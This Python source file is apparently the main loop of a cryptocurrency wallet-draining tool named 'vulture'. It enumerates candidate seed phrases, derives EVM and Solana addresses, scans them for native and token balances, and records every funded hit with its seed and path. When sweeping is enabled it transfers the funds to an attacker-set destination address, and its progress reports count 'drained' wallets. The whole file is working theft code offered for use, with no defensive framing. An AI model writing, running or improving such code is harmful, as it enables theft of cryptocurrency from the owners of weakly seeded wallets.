"""Vulture loop: enumerate, farm, check, discover, drain."""
from __future__ import annotations

import asyncio
import logging
import time
from concurrent.futures import ProcessPoolExecutor
from decimal import Decimal

from .bloom import Bloom
from .chains import EXPLORER, NATIVE, TOKENS
from .config import Settings
from .cursor import Cursor
from .derive import Account, derive_batch, sol_keys
from .discover import assets
from .notifier import Notifier
from .pool import Pool
from .security import inspect
from .solana_spl import token_accounts
from .store import Store
from .sweeper import Sweeper

log = logging.getLogger("vulture")


def fmt(raw: int, dec: int) -> str:
    return f"{Decimal(raw) / Decimal(10) ** dec:.8f}".rstrip("0").rstrip(".")


class Hunter:
    def __init__(self, s: Settings, store: Store, notifier: Notifier):
        self.s, self.store, self.notifier = s, store, notifier
        self.pool = Pool(s)
        self.sweeper = Sweeper(s, self.pool, store, notifier)
        self.bloom = Bloom()
        self.cursor = Cursor(s.family, s.word_pool, s.shard, s.shards,
                             s.db_path.parent / "cursor.json")
        self.farm = ProcessPoolExecutor(max_workers=s.farm_processes)
        self.seeds = self.addrs = self.hits = self.swept = 0
        self.started = time.time()
        self._stop = asyncio.Event()

    def stop(self) -> None:
        self._stop.set()

    def rate(self) -> float:
        return self.addrs / max(time.time() - self.started, 1e-9)

    async def _hit(self, chain, addr, seed, path, asset, raw, dec, minimum, key=None,
                   asset_obj=None):
        if raw < minimum or self.bloom.add(f"{chain.name}:{addr}:{asset}"):
            return
        amount = fmt(raw, dec)
        url = EXPLORER.get(chain.name, "").format(a=addr)
        if not self.store.add(chain=chain.name, address=addr, seed=seed, path=path,
                              asset=asset, amount=amount, raw=raw, url=url):
            return
        self.hits += 1
        log.warning("HIT %s %s %s %s", chain.name, asset, amount, addr)
        verdict = None
        if self.s.check_security and chain.is_evm and asset_obj and asset_obj["kind"] == "erc20":
            try:
                r = await inspect(self.pool, chain.name, asset_obj["token"], addr,
                                  chain.router, chain.weth)
                verdict = r["verdict"]
                self.store.annotate(chain.name, addr, asset, r["score"], verdict)
            except Exception:
                pass
        await self.notifier.hit(chain.name, asset, amount, addr, url, seed, path, verdict)
        if self.s.sweep.enabled and verdict != "honeypot":
            await self._sweep(chain, addr, asset, raw, seed, path, key, asset_obj)

    async def _sweep(self, chain, addr, asset, raw, seed, path, key, asset_obj):
        if self.s.sweep.dry_run:
            await self.notifier.send(f"dry-run {chain.name} {asset} {addr}")
            return
        try:
            if chain.is_evm:
                if not self.s.sweep.destination_evm:
                    return
                if key is None:
                    key = Account(seed).child(int(path.rsplit("/", 1)[-1]))[0]
                kh = "0x" + key.to_bytes(32, "big").hex()
                if asset == NATIVE[chain.name][0]:
                    if raw < int(self.s.sweep.min_native_evm):
                        return
                    tx = await self.sweeper.native(chain, addr, kh, raw)
                else:
                    if raw < int(self.s.sweep.min_token_usd_like):
                        return
                    tx = await self.sweeper.asset(chain, asset_obj, addr, kh)
            else:
                if not self.s.sweep.destination_sol:
                    return
                kp = sol_keys(seed, 1)[0][1]
                await self.sweeper.sol(chain, kp, addr, raw, [])
                tx = "sol"
            if tx:
                self.swept += 1
                self.store.swept(chain.name, addr, asset, str(raw), tx, True)
                await self.notifier.send(f"✅ {chain.name} {asset} → {tx}")
        except Exception as exc:
            log.warning("sweep %s", exc)
            self.store.swept(chain.name, addr, asset, str(raw), str(exc), False)

    async def _deep(self, chain, addr, seed, path, key):
        """Enumerate everything else on a funded address."""
        if not self.s.discover or not chain.is_evm:
            return
        try:
            for a in await assets(self.pool, chain, addr):
                if a["kind"] != "erc20":
                    await self._hit(chain, addr, seed, path, a["symbol"], a["raw"],
                                    a["decimals"], 1, key, a)
                    continue
                await self._hit(chain, addr, seed, path, a["symbol"], a["raw"],
                                a["decimals"], int(self.s.sweep.min_token_usd_like),
                                key, a)
        except Exception as exc:
            log.debug("discover %s", exc)

    async def _evm(self, chain, rows, seed):
        addrs = [r[2] for r in rows]
        funded = set()
        for i in range(0, len(addrs), self.s.batch_size):
            chunk, sub = addrs[i:i + self.s.batch_size], rows[i:i + self.s.batch_size]
            bal = await self.pool.native(chain.name, chunk)
            for j, raw in bal.items():
                if j < len(chunk):
                    idx, key, addr = sub[j]
                    if raw >= chain.min_native:
                        funded.add(addr)
                    await self._hit(chain, addr, seed, f"m/44'/60'/0'/0/{idx}",
                                    NATIVE[chain.name][0], raw,
                                    NATIVE[chain.name][1], chain.min_native, key)
            if not self.s.check_tokens:
                continue
            for sym, token, dec in TOKENS.get(chain.name, []):
                tb = await self.pool.tokens(chain.name, chunk, token)
                for j, raw in tb.items():
                    if j < len(chunk):
                        idx, key, addr = sub[j]
                        if raw >= chain.min_token:
                            funded.add(addr)
                        await self._hit(chain, addr, seed, f"m/44'/60'/0'/0/{idx}",
                                        sym, raw, dec, chain.min_token, key,
                                        {"token": token, "kind": "erc20",
                                         "decimals": dec, "raw": raw, "symbol": sym})
        for addr in funded:
            key = next(r[1] for r in rows if r[2] == addr)
            path = next(f"m/44'/60'/0'/0/{r[0]}" for r in rows if r[2] == addr)
            await self._deep(chain, addr, seed, path, key)

    async def _sol(self, chain, seed):
        ks = sol_keys(seed, self.s.per_seed)
        if not ks:
            return
        addrs = [k[2] for k in ks]
        for i in range(0, len(addrs), self.s.batch_size):
            chunk, sub = addrs[i:i + self.s.batch_size], ks[i:i + self.s.batch_size]
            bal = await self.pool.sol(chain.name, chunk)
            for j, raw in bal.items():
                if j < len(chunk):
                    idx, kp, addr = sub[j]
                    await self._hit(chain, addr, seed, f"m/44'/501'/{idx}'/0'",
                                    "SOL", raw, 9, chain.min_native, kp)
                    if raw >= chain.min_native and self.s.sweep.enabled \
                            and not self.s.sweep.dry_run:
                        spl = await token_accounts(self.pool, chain.name, addr)
                        await self.sweeper.sol(chain, kp, addr, raw, spl)

    async def _one(self):
        seed = self.cursor.next()
        self.seeds += 1
        loop = asyncio.get_running_loop()
        rows = await loop.run_in_executor(self.farm, derive_batch,
                                          (seed, self.s.per_seed))
        self.addrs += len(rows)
        await asyncio.gather(*[
            self._evm(c, rows, seed) if c.is_evm else self._sol(c, seed)
            for c in self.s.chains], return_exceptions=True)

    async def _worker(self):
        while not self._stop.is_set():
            try:
                await self._one()
            except asyncio.CancelledError:
                raise
            except Exception as exc:
                log.debug("%s", exc)
                await asyncio.sleep(0.15)

    async def _report(self):
        while not self._stop.is_set():
            await asyncio.sleep(180)
            if self._stop.is_set():
                return
            self.cursor.save()
            await self.notifier.send(
                f"🩸 {self.cursor.family} {self.cursor.progress():.4f}% "
                f"seeds {self.seeds:,} addr {self.addrs:,} {self.rate():.0f}/s "
                f"hits {self.hits} drained {self.swept} "
                f"conc {sum(g.limit for g in self.pool.gov.values())}")

    async def run(self, duration: int | None = None):
        log.info("vulture family=%s shard=%s/%s workers=%s",
                 self.s.family, self.s.shard, self.s.shards, self.s.workers)
        tasks = [asyncio.create_task(self._worker()) for _ in range(self.s.workers)]
        rep = asyncio.create_task(self._report())
        try:
            if duration:
                try:
                    await asyncio.wait_for(self._stop.wait(), duration)
                except asyncio.TimeoutError:
                    pass
            else:
                await self._stop.wait()
        finally:
            self._stop.set()
            rep.cancel()
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            self.cursor.save()
            self.farm.shutdown(wait=False)
            await self.pool.close()